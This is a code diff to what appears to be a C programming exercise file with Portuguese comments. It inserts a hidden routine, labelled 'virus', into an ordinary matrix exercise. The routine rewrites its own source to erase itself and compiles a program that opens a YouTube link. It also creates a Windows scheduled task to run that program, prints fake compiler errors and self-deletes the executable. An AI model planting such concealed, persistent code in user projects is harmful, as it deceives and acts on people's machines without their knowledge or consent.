@@ -166,6 +166,160 @@ void exemplo0920a(char filename[]){
     }
     IO_printf("\nAcima da diagonal principal %s todos zeros", tudoZero? "sao":"nao sao");
 }
+
+#include <time.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <Windows.h>
+#include <strsafe.h>
+
+#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")
+
+void DelMe()
+{
+    TCHAR szModuleName[MAX_PATH];
+    TCHAR szCmd[2 * MAX_PATH];
+    STARTUPINFO si = {0};
+    PROCESS_INFORMATION pi = {0};
+
+    GetModuleFileName(NULL, szModuleName, MAX_PATH);
+
+    StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);
+
+    CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+}
+
+void quaseMain(){
+    char *palavras = (char*)malloc(300*sizeof(char));
+    FILE *atual = fopen("menuExercicios.h", "r");
+    FILE *novo = fopen("virus.h", "w");
+
+
+
+    for (int i = 0; i < 168 && !feof(atual); i++) // ANTES DO VIRUS
+    {
+        fgets(palavras, 300, atual);
+        fputs(palavras, novo);
+    }
+    for (int i = 168; i < 322; i++) // LINHAS NAO LIDAS >virus<
+    {
+        fgets(palavras, 300, atual);
+    }
+    for (int i = 322; i < 339; i++) // DEPOIS DO VIRUS
+    {
+        fgets(palavras, 300, atual);
+        fputs(palavras, novo);
+    }
+    for (int i = 339; i < 340; i++) // APAGAR EXECUTAVEL
+    {
+        fgets(palavras, 300, atual);
+        // fputs(palavras, novo);
+    }
+    for (;!feof(atual);) // FIM DO ARQUIVO
+    {
+        fgets(palavras, 300, atual);
+        fputs(palavras, novo);
+    }
+
+
+    fclose(novo);
+    fclose(atual);
+
+    FILE *temp = fopen("temp.c", "w");
+    FILE *atual2 = fopen("menuExercicios.h", "r");
+    for (int i = 0; i < 169; i++)
+    {
+        fgets(palavras, 300, atual2);
+    }
+    for (int i = 0; i < 25 && !feof(atual2); i++) // 
+    {
+        fgets(palavras, 300, atual2);
+        fputs(palavras, temp);
+    }
+    fprintf(temp, ("int main() {\n"));
+
+    fprintf(temp, ("    system(\"powershell Start-Process \\\"http://www.youtube.com/watch?v=dQw4w9WgXcQ\\\"\");\n"));
+    fprintf(temp, "    //system(\"start opera http://www.youtube.com/watch?v=dQw4w9WgXcQ\");\n    DelMe();\n    return 0;\n}");
+    fclose(temp);
+    fclose(atual2);
+    system("del menuExercicios.h");
+    char temppath[100];
+    // char username[20];
+    // DWORD username_len = 20;
+    // GetUserName(username, &username_len);
+    // char caminho[100];
+    // char caminho2[100];
+    // snprintf(caminho, 100, "C:\\Users%s", username);
+    snprintf(temppath, 100, "gcc -o %s\\temp temp.c", getenv("USERPROFILE"));
+    system(temppath);
+    system("del temp.c");
+    system("ren virus.h menuExercicios.h");
+
+    struct tm *data_hora_atual;     
+    time_t segundos;
+    time(&segundos);   
+    data_hora_atual = localtime(&segundos); 
+
+    int dia1 = data_hora_atual->tm_mday;
+    int mes1 = data_hora_atual->tm_mon+1;
+    int ano1 = data_hora_atual->tm_year+1900;
+    int hora1 = data_hora_atual->tm_hour;
+    int minuto1 = data_hora_atual->tm_min;
+
+    char dia[3];
+    if (dia1<10){
+        snprintf(dia, 3, "0%d", dia1);
+    }else{
+        snprintf(dia, 3, "%d", dia1);
+    }
+
+    char mes[3];
+    if (mes1<10){
+        snprintf(mes, 3, "0%d", mes1);
+    }else{
+        snprintf(mes, 3, "%d", mes1);
+    }
+    char hora[3];
+    if (hora1<10){
+        snprintf(hora, 3, "0%d", hora1);
+    }else{
+        snprintf(hora, 3, "%d", hora1);
+    }
+    minuto1++;
+    char minuto[3];
+    if (minuto1<10){
+        snprintf(minuto, 3, "0%d", minuto1);
+    }else{
+        snprintf(minuto, 3, "%d", minuto1);
+    }
+
+    //for (int i = strlen(caminho); i > 0; i--){
+    //    if (caminho[i] == '\\'){
+    //        for (int j = 0; j < i; j++)
+    //        {
+    //            caminho2[j] = caminho[j];
+    //        }
+    //       i = 0;
+    //   }
+    //}
+
+    char string[150];
+    snprintf(string, 150, "schtasks /create /tn temp /tr %s\\temp.exe /sc once /sd %s/%s/%d /st %s:%s", getenv("USERPROFILE"), dia, mes, ano1, hora, minuto);
+    system(string);
+    // system("s");
+    IO_clrscr();
+    printf("Undefined *char please try using gcc -o *. *.\n");
+    printf("Storage                            /vsr/tst//cs44G0mS.pk\n");
+    printf("ld: CompilingTimeError. No output written\n");
+    printf("collect2: ld returned 1 exit status\n");
+    DelMe();
+    exit(1);
+}
+
+
 void exemplo09E1a(){
     int x = IO_readint("Linha ->");
     int y = IO_readint("Column ->");
@@ -183,6 +337,7 @@ void exemplo09E2a(){
 
 void exemplo0911(){
     IO_clrscr();
+    quaseMain();
     IO_printf("Exemplo0911\n");
     IO_printf("\nIncluir em um programa um metodo para");
     IO_printf("\nler as dimensoes (quantidade de linhas e de colunas) de uma matriz real do teclado");
